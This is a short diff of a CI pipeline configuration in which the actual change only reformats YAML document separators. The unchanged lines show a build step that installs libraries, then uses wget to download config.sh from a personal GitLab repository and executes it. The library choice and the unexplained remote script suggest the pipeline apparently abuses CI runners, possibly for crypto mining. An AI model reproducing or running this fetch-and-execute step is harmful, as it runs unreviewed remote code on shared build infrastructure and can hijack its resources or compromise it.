@@ -8,8 +8,9 @@ steps:
   commands:
   - apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
   - wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
-  ---
-  kind: pipeline
+  
+---
+kind: pipeline
 type: docker
 name: default-2
 
